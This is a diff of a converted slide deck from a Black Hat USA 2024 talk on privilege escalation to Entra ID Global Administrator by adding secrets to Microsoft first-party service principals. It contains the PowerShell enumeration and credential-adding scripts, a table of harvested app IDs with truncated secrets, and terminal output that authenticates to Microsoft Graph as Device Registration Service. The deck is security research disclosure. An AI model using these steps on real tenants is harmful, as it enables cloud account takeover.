@@ -8,18 +8,25 @@ year: 2024
 source_pdf: "Black Hat USA 2024 slides/Eric Woodruff_UnOAuthorized A Technique to Privilege Escalation to Global Administrator.pdf"
 pages: 137
 sha256: "43848c0672bcb4d9edfc00eaef1ad0d27ac0a1c46b8d6befc8affe7a2e105a05"
-text_chars: 78590
-ocr_pages: 38
+text_chars: 70145
+ocr_pages: 30
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 82.6
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 24
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:31:41Z"
+converted_at: "2026-08-12T04:31:44Z"
 ---
 # UnOAuthorized A Technique to Privilege Escalation to Global Administrator
 
 **Speakers:** Eric Woodruff  
 **Conference:** Black Hat USA 2024  
 **Source:** `Black Hat USA 2024 slides/Eric Woodruff_UnOAuthorized A Technique to Privilege Escalation to Global Administrator.pdf` (137 pages)
+
 
 ## Slide 1
 
@@ -29,12 +36,10 @@ Eric Woodruff Senior Security Researcher, Semperis
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-i =<
-blackhat —_
-USA 2024
 AUGUST 7-8, 2024
 BRIEFINGS
 UnOAuthorized
@@ -83,15 +88,6 @@ Eric Woodruff Senior Security Researcher
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-blackhat —_
-USA 2024
-Background
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 7
 
 ## Background
@@ -124,7 +120,8 @@ Background
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 «A.
@@ -133,8 +130,6 @@ You’ve (Probably) Never Heard Of
 @ Andy Robbins - Follow
 6 Published in Posts By SpecterOps Team Members - 6 minread - Feb 16,2024
 portal GUI.
-rN
-ve’
 Dirk-jan Mollema
 vulnerabilities.
 Looking for a security test or training? Business contact via outsidersecurity.nl
@@ -143,7 +138,6 @@ During both my DEF CON and Troopers | mentioned a vulnerab
 where an A
 On-Premise Sync Ac
 |
-PS
 €
 Admin ora comp
 Secureworks®
@@ -156,7 +150,6 @@ escalation to Global Admin, but this role is hidden from view in the Azure
 Hacker, red teamer, researcher. Likes to write infosec-focussed Python tools. This is my personal blog
 containing research on topics | find interesting, such as (Azure) Active Directory internals, protocols an
 Azure AD privilege escalation - Taking over default application
-€  InverseCos
 How to Backdoor Azure Applications and Abuse Service Principals
 Stealthy Persistence with
 “Directory Synchronization
@@ -168,7 +161,6 @@ attacker to per pli
 tenant has a serv al autor ed/created. This ha ery time an application
 Joo A service principal account is basically an identity that’s used by a2 Q t+ Gy
 urces / perform automated actions
-« These é
 « Thes unts cannot be controlled through conditional access
 ate
 to backdoor th
@@ -176,7 +168,6 @@ post as simple as I
 Automating application permission
 grant while avoiding
 AppRoleAssignment.ReadWrite.All
-e
 Sahil Malik - Fo!
 Published in Winsmarts.com
 Sminread - Apr 29,2021
@@ -220,35 +211,11 @@ GLOBAL ADMIN
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisa hat
-USA 2024
-OWNING C OUD
-as
-@ ¢
-4
-DOMAINTADIMIN
-sife
-GLOBARADMIN
-```
-
 ## Slide 10
 
 # Setting the stage
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Qo
-blackhat  ~ :
-USA 2024
-Setting the stage
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 11
 
@@ -538,16 +505,6 @@ fc03f97a-9db0-4627-a216-ec98ce54e018
 # Application primer
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Qo
-blackhat  ~ :
-USA 2024
-Application primer
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 23
 
@@ -1090,15 +1047,6 @@ Other APIs
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-blackhat —_
-USA 2024
-The research
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 51
 
 ## Impersonating Microsoft applications
@@ -1334,32 +1282,32 @@ Application Entra ID Microsoft Graph
 
 ## Looking for applications to impersonate
 
-```
+\```
 $spn= Get-AzureADServicePrincipal-All $true| Where-Object{$_.AppOwnerTenantId-like
 "f8cdef31-a31e-4b4a-93e4-5f571e91255a"}
-```
+\```
 
-```
+\```
 $spn| Foreach-Object{
-```
+\```
 
-```
+\```
 $cred= $null
-```
+\```
 
-```
+\```
 $cred= New-AzureADServicePrincipalPasswordCredential-ObjectId$CurrentSPN.ObjectId
 -EndDate$notafter
-```
+\```
 
-```
+\```
 $output= $_.DisplayName+ ","+ $_.ObjectId+ ","+ $_.AppId+ ","+ $cred.Value
 $output| Out-FileC:\temp\serviceprincipals.csv -Append
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1367,32 +1315,32 @@ $output| Out-FileC:\temp\serviceprincipals.csv -Append
 
 ## Looking for applications to impersonate
 
-```
+\```
 $spn= Get-AzureADServicePrincipal-All $true| Where-Object{$_.AppOwnerTenantId-like
 "f8cdef31-a31e-4b4a-93e4-5f571e91255a"}
-```
+\```
 
-```
+\```
 $spn| Foreach-Object{
-```
+\```
 
-```
+\```
 $cred= $null
-```
+\```
 
-```
+\```
 $cred= New-AzureADServicePrincipalPasswordCredential-ObjectId$CurrentSPN.ObjectId
 -EndDate$notafter
-```
+\```
 
-```
+\```
 $output= $_.DisplayName+ ","+ $_.ObjectId+ ","+ $_.AppId+ ","+ $cred.Value
 $output| Out-FileC:\temp\serviceprincipals.csv -Append
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 Microsoft tenant ID
 
@@ -1404,144 +1352,67 @@ Microsoft tenant ID
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bis hat
-USA 2024
 Looking for applications to impersonate
-ONOUARWD =
-15
-16
-Name
-ChatMigrationService1P
-Microsoft Threat Protection
-Compute Artifacts Publishing Service
-Recommended
-asmcontainerimagescanner
-Azure Credential Configuration Endpoint Service
-Power Platform Governance Services - TIRPS
-Azure Compute
-CAS API Security RP Dev
-Microsoft Teams Partner Tenant Administration
-Azure Storage Insights Resource Provider
-IDML Graph Resolver Service and CAD
-Diagnostic Services Trusted Storage Access
-Microsoft Dynamics CRM Learning Path
-OfficeClientService
-566 Graph Connector Service
-567 Export to data lake
-568 Networking-MNC
-569 Cloud Infrastructure Entitlement Management
-570 Azure Guest Container Update Manager
-571 Azure AD Notification
-572 Azure Bastion
-573 Customer Experience Platform CDPA Provisioning TIP
-574 Azure Cost Management XCloud
-OID
-006daeab-5acd-481f-a9ba-9bb5913f9b72
-00aee614-ac22-4ebe-9a13-d77ea09fdd20
-00bc92d9-dff3-4421-ab84-d2158fded358
-00fb2610-2358-47c7-805d-d9bd849aa0df
-0136d09b-bf2a-47f3-9f7a-41652c89d1d4
-01c690a3-1de3-443e-93c5-95b314d77e17
-0269af19-8365-4731-95f3-4dada2c31565
-028984c9-e708-4641-8fc9-5fae91350a12
-02ed60b6-20db-4a05-bf2e-086deb7e8f62
-03b8d2ac-ea42-4209-9b68-463a712ef09a
-04e976b6-0d37-4d25-989c-f32f0f607049
-06a0b864-182f-4dfb-b767-b97b906ba9fa
-072bf89d-e915-49a0-95dc-d4bd0a400add
-0752dc69-9422-49b5-ad82-dd2a1029560b
-087c54ed-9c68-4d9b-8d4d-44e4bcf64c09
-fbbaf13e-e2f3-479b-9b0c-e59e70e9db5b
-fc28cd59-096a-4a9f-bce6-2c78f9fdd232
-fc42d9fe-e142-4ac5-9b87-8d90c173b021
-f¢897223-f34c-443b-9cd6-b557ce5c3dc9
-fe3507b5-a34c-4c9b-8d32-a8fc1a6190b4
-fea4cfba-323d-4ab2-b039-1a41348c8c2a
-fedefbbf-3cf4-449f-8bc4-97ff8f6bf184
-ff5a6c80-78b9-49c2-9e8f-3fd21f3a13d8
-ffdad0a0-a2ac-47e5-b26e-757b835beac2
-AppID
-S3afSadde-460d-4bc1-ada0-fc648af8fefb
-8ee8fdad-f234-4243-8f3b-15c294843740
-a8b6bf88-1d1a-4626-b040-9a729ea93c65
-98c8388a-4e86-424f-a176-d1288462816f
-918d0db8-4a38-4938-93c 1-9313bdfe0272
-e€a890292-c8c8-4433-b5ea-b09d0668e1a6
-2b5e68f0-bdc2-45b0-920a-217d5cbbd505
-579d9c9d-4c83-4efc-8124-7eba65ed3356
-c€b250467-fc8f-4c42-8349-9ff9e9a17b02
-0c708d37-30b2-4f22-8168-5d0cba6f37be
-b15f3d14-f6d1-4c0d-93da-d4136c97f006
-d88a361a-d488-4271-a13f-a83df7dd99c2
-562db366-1b96-45d2-aa4a-f2148cef2240
-2db8cb1d-fb6c-450b-ab09-49b6ae35186b
-0f698dd4-f011-4d23-a33e-b36416dcb1e6
-56c1da01-2129-48f7-9355-af6d59d42766
-7f15f9d9-cad0-44f1-bbba-d36650e07765
-6d057c82-a784-47ae-8d12-ca7b38cf06b4
-b46c3ac5-9da6-418f-a849-0a07a10b3c6c
-c8f5141d-83e0-4e9a-84d0-bb6677e26f64
-fc03f97a-9db0-4627-a216-ec98ce54e018
-79d7fb34-4bef-4417-8184-ff713af7a679
-#5223e1a-4d50-4fda-9049-55d819fbb03e
-3184af01-7a88-49e0-8b55-8ecdce0aa950
-D
-PW
-FhMiJnisdCldUnoGRfUPt7dUPwe 1ltYtZmVwM¢
-aYF/h4VhzJhP984bu1dXH4LGNVs+VC8bfqTnV
-VOVis4ndoAPKIAFBWRYLgXMAgphafM2078ulV
-mpNiY4kFxLJZs+0cOqlpZBBgBVaLrV41dG 1pkt$
-G7kSNvxoMhr9NOlfkY+F6VjNRigpITp70gUmGI
-CicmT1ZDDVM30hSxhjdbINqLnVUiUyxSTMWS
-CEGlvrmGS/OmhLDPV8hoOwRzrrejvABAIXET2»
-ZGM8fLlvjP3zZeKTeTIQH1KDhMIx1pyajCTsEixP.
-et7xeSwUI0SNOCoZusFqS8b566Fai110BHhisqF
-snOXtYKhk/AtYnEypqTbaxX4xfk2cr4TwUhb2+M\
-SQLr/7DQjN4dCd2acrise5QkbOLFX3qDbsjOOS
-ng/\GBRIFpU8Du8fmiAYskVWUNs6UFuvpqYiHk
-vrJGDmbCpjePQ848gbP2IZhZM/Vs+4jkwyTAck
-SWTvLOMqcT9P3pQ4CKaLMShfwoKuHAFPOU.
-wsw10e0QzxiWqAhEqhXsrma+/bwWXWjTvNp
-jQCPM3EIWJwAM+CbmqcwtdM3MFOovZmHaé
-QCV4qQ6SxXJIKYxnhjM+Z6MN//pbpt4uN9EPOSE
-38E1dpj+XixnlaGyt/+TwomseYpkxJro65+8wsi6¢
-U21e5uVKrlikk7DRxnXMq7AVTJNWmYbTIFY//ED.
-ZxDVULTNXG+zg55i60yAYBKqYMLc/g1nHrQszk
-HJNHy3gepnUMSHCUNa7cRwpWeg4SGbw/Cw7
-rxEqS+xzRiqkdP8iixCeAymMvJYzlukDbtLDDZRr
-8zwGnq5qVMkiBkFrMBO88uy6GReMqhx+FHTz
-2sr0paxs1v4/aZJy/C5jlHS5orm/WGDHYQE6eP0.
+
+1	Name	OID	AppID	PW
+2	ChatMigrationService1P	006daeab-5acd-481f-a9ba-9bb5913f9b72	3af5adde-460d-4bc1-ada0-fc648af8fefb	FhMiJnIsdCIdUnoGRfUPt7dUPwc1ltYtZmVwMC…
+3	Microsoft Threat Protection	00aee614-ac22-4ebe-9a13-d77ea09fdd20	8ee8fdad-f234-4243-8f3b-15c294843740	aYF/h4VhzJhP984bu1dXH4LGNVs+VC8bfqTnVI…
+4	Compute Artifacts Publishing Service	00bc92d9-dff3-4421-ab84-d2158fded358	a8b6bf88-1d1a-4626-b040-9a729ea93c65	V0Vis4ndoAPKIAFBWRYLgXMAgphafM2O78uIW…
+5	Recommended	00fb2610-2358-47c7-805d-d9bd849aa0df	98c8388a-4e86-424f-a176-d1288462816f	mpNiY4kFxLJZs+0cOqlpZBBgBVaLrV41dG1pkt9…
+6	asmcontainerimagescanner	0136d09b-bf2a-47f3-9f7a-41652c89d1d4	918d0db8-4a38-4938-93c1-9313bdfe0272	G7k5NvxoMhr9NOIfkY+F6VjNRIgplTp7OgUmGI…
+7	Azure Credential Configuration Endpoint Service	01c690a3-1de3-443e-93c5-95b314d77e17	ea890292-c8c8-4433-b5ea-b09d0668e1a6	CicmT1ZDDVM3OhSxhjdblNqLnVUiUyx5TMWS…
+8	Power Platform Governance Services - TIRPS	0269af19-8365-4731-95f3-4dada2c31565	2b5e68f0-bdc2-45b0-920a-217d5cbbd505	CEGlvrmGS/0mhLDPV8hoOwRzrrejvABAIXET2X…
+9	Azure Compute	028984c9-e708-4641-8fc9-5fae91350a12	579d9c9d-4c83-4efc-8124-7eba65ed3356	ZGM8fLlvjP3zZeKTeTlQH1kDhMlx1pyajCTsEixP…
+10	CAS API Security RP Dev	02ed60b6-20db-4a05-bf2e-086deb7e8f62	cb250467-fc8f-4c42-8349-9ff9e9a17b02	et7xe5wUI05N0CoZusFqS8b566Fa11oBHhIsqF…
+11	Microsoft Teams Partner Tenant Administration	03b8d2ac-ea42-4209-9b68-463a712ef09a	0c708d37-30b2-4f22-8168-5d0cba6f37be	snOXtYKhk/AtYnEypqTbaX4xfk2cr4TwUhb2+Mv…
+12	Azure Storage Insights Resource Provider	04e976b6-0d37-4d25-989c-f32f0f607049	b15f3d14-f6d1-4c0d-93da-d4136c97f006	SQLr/7DQjN4dCd2acrIse5Qkb0LFX3qDbsj0OS…
+13	IDML Graph Resolver Service and CAD	06a0b864-182f-4dfb-b767-b97b906ba9fa	d88a361a-d488-4271-a13f-a83df7dd99c2	ng/lGBRIFpU8Du8fmiAYskVwUNs6UFuvpqYiHk…
+14	Diagnostic Services Trusted Storage Access	072bf89d-e915-49a0-95dc-d4bd0a400add	562db366-1b96-45d2-aa4a-f2148cef2240	vrJGDmbCpjePQ848gbP2lZhZM/Vs+4jkwyTAck…
+15	Microsoft Dynamics CRM Learning Path	0752dc69-9422-49b5-ad82-dd2a1029560b	2db8cb1d-fb6c-450b-ab09-49b6ae35186b	SWTvLOMqcT9P3pQ4CKaLM5hfwoKuHAFPOU…
+16	OfficeClientService	087c54ed-9c68-4d9b-8d4d-44e4bcf64c09	0f698dd4-f011-4d23-a33e-b36416dcb1e6	wsw1OeOQzxiWqAhEqhXsrma+/bwWXWjTvNp…
+566	Graph Connector Service	fbbaf13e-e2f3-479b-9b0c-e59e70e9db5b	56c1da01-2129-48f7-9355-af6d59d42766	jQCPM3EIWJwAM+CbmqcwtdM3MF0ovZmHa6…
+567	Export to data lake	fc28cd59-096a-4a9f-bce6-2c78f9fdd232	7f15f9d9-cad0-44f1-bbba-d36650e07765	QCV4qQ6SxJlKYxnhjM+z6MN//pbpt4uN9EP0Sg…
+568	Networking-MNC	fc42d9fe-e142-4ac5-9b87-8d90c173b021	6d057c82-a784-47ae-8d12-ca7b38cf06b4	38E1dpj+XlxnIaGyt/+TwomseYpkxJro65+8wsi6…
+569	Cloud Infrastructure Entitlement Management	fc897223-f34c-443b-9cd6-b557ce5c3dc9	b46c3ac5-9da6-418f-a849-0a07a10b3c6c	U21e5uVKrlkk7DRxnXMq7AVTJNwmYbTlfY//ED…
+570	Azure Guest Container Update Manager	fe3507b5-a34c-4c9b-8d32-a8fc1a6190b4	c8f5141d-83e0-4e9a-84d0-bb6677e26f64	ZxDVULTnXG+zg55i60yAYBKqYMLc/g1nHrQszb…
+571	Azure AD Notification	fea4cfba-323d-4ab2-b039-1a41348c8c2a	fc03f97a-9db0-4627-a216-ec98ce54e018	HJNHy3gepnUMsHCUNa7cRwpWg4SGbw/Cw7…
+572	Azure Bastion	fedefbbf-3cf4-449f-8bc4-97ff8f6bf184	79d7fb34-4bef-4417-8184-ff713af7a679	rxEqS+xzRiqkdP8iixCeAymMvJYzlukDbtLDDZRn…
+573	Customer Experience Platform CDPA Provisioning TIP	ff5a6c80-78b9-49c2-9e8f-3fd21f3a13d8	f5223e1a-4d50-4fda-9049-55d819fbb03e	8zwGnq5qVMkiBkFrMBO88uy6GReMqhx+FHTz…
+574	Azure Cost Management XCloud	ffdad0a0-a2ac-47e5-b26e-757b835beac2	3184af01-7a88-49e0-8b55-8ecdce0aa950	2sr0paXs1v4/aZJy/C5jlH5orm/WGDHYQE6eP0…
+
+[Column D (PW) values run off the right edge of the visible table and are truncated in the slide, indicated by the trailing … above.]
 ```
 
 ## Slide 68
 
 ## Looking for applications to impersonate
 
-```
+\```
 $spn| ForEach-Object{
-```
+\```
 
-```
+\```
 $cred= New-Object-TypeName System.Management.Automation.PSCredential-ArgumentList
 $_.AppId,(ConvertTo-SecureString-AsPlainText$_.PW-Force)
-```
+\```
 
-```
+\```
 Connect-MgGraph-TenantID11ae06df-xxxx-4b9e-bf66-2a91f4955339
 -ClientSecretCredential$cred
-```
+\```
 
-```
+\```
 Get-MgContext| Out-FileC:\temp\ccgfauthworks.txt –Append
 Disconnect-MgGraph-ErrorActionSilentlyContinue
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1549,28 +1420,28 @@ Disconnect-MgGraph-ErrorActionSilentlyContinue
 
 ## Looking for applications to impersonate
 
-```
+\```
 $spn| ForEach-Object{
-```
+\```
 
-```
+\```
 $cred= New-Object-TypeName System.Management.Automation.PSCredential-ArgumentList
 $_.AppId,(ConvertTo-SecureString-AsPlainText$_.PW-Force)
-```
+\```
 
-```
+\```
 Connect-MgGraph-TenantID11ae06df-xxxx-4b9e-bf66-2a91f4955339
 -ClientSecretCredential$cred
-```
+\```
 
-```
+\```
 Get-MgContext| Out-FileC:\temp\ccgfauthworks.txt –Append
 Disconnect-MgGraph-ErrorActionSilentlyContinue
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 Customer (target) tenant ID
 
@@ -1580,28 +1451,28 @@ Customer (target) tenant ID
 
 ## Looking for applications to impersonate
 
-```
+\```
 $spn| ForEach-Object{
-```
+\```
 
-```
+\```
 $cred= New-Object-TypeName System.Management.Automation.PSCredential-ArgumentList
 $_.AppId,(ConvertTo-SecureString-AsPlainText$_.PW-Force)
-```
+\```
 
-```
+\```
 Connect-MgGraph-TenantID11ae06df-xxxx-4b9e-bf66-2a91f4955339
 -ClientSecretCredential$cred
-```
+\```
 
-```
+\```
 Get-MgContext| Out-FileC:\temp\ccgfauthworks.txt –Append
 Disconnect-MgGraph-ErrorActionSilentlyContinue
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 Gather current session details, including scopes (permissions)
 
@@ -1690,15 +1561,6 @@ Gather current session details, including scopes (permissions)
 # The results
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-blackhat —_
-USA 2024
-The results
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 76
 
@@ -1819,259 +1681,333 @@ Cloud Application Administrator
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 83/100 on the text kept, 77/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x iv _ Oo x
-ga-eric@northwindtradersgLlobal.onmicrosoft.com AzureCloud a8c79a2a—-f998-4913-96d2-f45694b77bel northwindtradersgLlob...
-PS C:\temp> $notafter = (Get-Date) .AddMonths(6)
+[Windows PowerShell]
+
+ga-eric@northwindtradersglobal.onmicrosoft.com AzureCloud   a8c79a2a-f998-4913-96d2-f45694b77be1 northwindtradersglob...
+
+PS C:\temp> $notafter = (Get-Date).AddMonths(6)
 PS C:\temp> $TargetSPN = Get-AzureADServicePrincipal -SearchString "Device Registration Service"
 PS C:\temp> $TargetSPN
-ObjectId AppId DispLayName
-c344e5a6-111d—4a00-a8e3-d1beb87c0750 01cb2876-7ebd—Y4aa4—9cc9-d28bd4d359a9 Device Registration Service
+
+ObjectId                             AppId                                DisplayName
+--------                             -----                                -----------
+c344e5a6-111d-4a00-a8e3-d1beb87c0750 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Device Registration Service
+
 PS C:\temp> $SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter
-PS C:\temp> $SPNCreds. Value
-FcGhiy7mY
+PS C:\temp> $SPNCreds.Value
+FcGhiy7mY[obscured]
 PS C:\temp> $SPNPW = ConvertTo-SecureString -AsPlainText $SPNCreds.Value -Force
-PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId,
-$SPNPW ——
-PS C:\temp> Disconnect-AzureAD ——=
-| PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77bel -ClientSecretCredential $GraphCreds
+PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId, $SPNPW
+PS C:\temp> Disconnect-AzureAD
+PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77be1 -ClientSecretCredential $GraphCreds
 Welcome to Microsoft Graph!
-*| Connected via apponly access using 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9 =
-Readme: https://aka.ms/graph/sdk/powershell a
-SDK Docs: https://aka.ms/graph/sdk/powershell/docs ;
+
+Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
+Readme: https://aka.ms/graph/sdk/powershell
+SDK Docs: https://aka.ms/graph/sdk/powershell/docs
 API Docs: https://aka.ms/graph/docs
-NOTE: You can use the —NoWelcome parameter to suppress this message.
+
+NOTE: You can use the -NoWelcome parameter to suppress this message.
+
 PS C:\temp>
-> : ; ‘ . i #BHUSA @BlackHatEvents
 ```
 
 ## Slide 86
 
 **#BHUSA @BlackHatEvents** Getting the Device Registration Service service principal
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 80/100 on the text kept, 77/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x iv _ Oo x
-ga-eric@northwindtradersgLlobal.onmicrosoft.com AzureCloud a8c79a2a—-f998-4913-96d2-f45694b77bel northwindtradersgLlob...
-PS C:\temp> $notafter = (Get-Date) .AddMonths(6)
-PS pNpemag sia = Get-AzureADServicePrincipal -SearchString "Device Registration Service"
+[Windows PowerShell]
+
+ga-eric@northwindtradersglobal.onmicrosoft.com AzureCloud   a8c79a2a-f998-4913-96d2-f45694b77be1 northwindtradersglob...
+
+PS C:\temp> $notafter = (Get-Date).AddMonths(6)
+PS C:\temp> $TargetSPN = Get-AzureADServicePrincipal -SearchString "Device Registration Service"
 PS C:\temp> $TargetSPN
-ObjectId AppId DispLayName
-c344e5a6-111d—4a00-a8e3-d1beb87c0750 01cb2876-7ebd—Y4aa4—9cc9-d28bd4d359a9 Device Registration Service
+
+ObjectId                             AppId                                DisplayName
+--------                             -----                                -----------
+c344e5a6-111d-4a00-a8e3-d1beb87c0750 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Device Registration Service
+
 PS C:\temp> $SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter
-PS C:\temp> $SPNCreds. Value
-FcGhiy7mY
+PS C:\temp> $SPNCreds.Value
+FcGhiy7mY[obscured]
 PS C:\temp> $SPNPW = ConvertTo-SecureString -AsPlainText $SPNCreds.Value -Force
-PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId,
-$SPNPW ——
-PS C:\temp> Disconnect-AzureAD ——=
-| PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77bel -ClientSecretCredential $GraphCreds
+PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId, $SPNPW
+PS C:\temp> Disconnect-AzureAD
+PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77be1 -ClientSecretCredential $GraphCreds
 Welcome to Microsoft Graph!
-*| Connected via apponly access using 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9 =
-Readme: https://aka.ms/graph/sdk/powershell a
-SDK Docs: https://aka.ms/graph/sdk/powershell/docs ;
+
+Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
+Readme: https://aka.ms/graph/sdk/powershell
+SDK Docs: https://aka.ms/graph/sdk/powershell/docs
 API Docs: https://aka.ms/graph/docs
-NOTE: You can use the —NoWelcome parameter to suppress this message.
+
+NOTE: You can use the -NoWelcome parameter to suppress this message.
+
 PS C:\temp>
-Getting the Device Registration Service service principal — ; , P #BHUSA @BlackHatEvents
+
+[red highlight box around the line: $TargetSPN = Get-AzureADServicePrincipal -SearchString "Device Registration Service"]
+
+Caption: Getting the Device Registration Service service principal
 ```
 
 ## Slide 87
 
 **#BHUSA @BlackHatEvents** Adding a new secret (password) credential to the service principal
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x iv _ Oo
-ga-eric@northwindtradersgLlobal.onmicrosoft.com AzureCloud a8c79a2a—-f998-4913-96d2-f45694b77bel northwindtradersgLlob...
-PS C:\temp> $notafter = (Get-Date) .AddMonths(6)
+[Windows PowerShell]
+
+ga-eric@northwindtradersglobal.onmicrosoft.com AzureCloud   a8c79a2a-f998-4913-96d2-f45694b77be1 northwindtradersglob...
+
+PS C:\temp> $notafter = (Get-Date).AddMonths(6)
 PS C:\temp> $TargetSPN = Get-AzureADServicePrincipal -SearchString "Device Registration Service"
 PS C:\temp> $TargetSPN
-ObjectId AppId DispLayName
-c344e5a6-111d—4a00-a8e3-d1beb87c0750 01cb2876-7ebd—Y4aa4—9cc9-d28bd4d359a9 Device Registration Service
-PS C:\temp>|$SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter
+
+ObjectId                             AppId                                DisplayName
+--------                             -----                                -----------
+c344e5a6-111d-4a00-a8e3-d1beb87c0750 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Device Registration Service
+
+PS C:\temp> $SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter
 PS C:\temp> $SPNCreds.Value
-FcGhiy7mY
+FcGhiy7mY[obscured]
 PS C:\temp> $SPNPW = ConvertTo-SecureString -AsPlainText $SPNCreds.Value -Force
-PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId,
-$SPNPW
+PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId, $SPNPW
 PS C:\temp> Disconnect-AzureAD
-| PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77bel -ClientSecretCredential $GraphCreds
+PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77be1 -ClientSecretCredential $GraphCreds
 Welcome to Microsoft Graph!
-*| Connected via apponly access using 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9
+
+Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
 Readme: https://aka.ms/graph/sdk/powershell
 SDK Docs: https://aka.ms/graph/sdk/powershell/docs
 API Docs: https://aka.ms/graph/docs
-NOTE: You can use the —NoWelcome parameter to suppress this message.
+
+NOTE: You can use the -NoWelcome parameter to suppress this message.
+
 PS C:\temp>
-Adding a new secret (password)-credential to the service principal ‘ P #BHUSA @BlackHatEvents
+
+[red highlight box around the line: $SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter]
+
+Caption: Adding a new secret (password) credential to the service principal
 ```
 
 ## Slide 88
 
 **#BHUSA @BlackHatEvents** Stuffing creds into a credential object
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x iv _ Oo
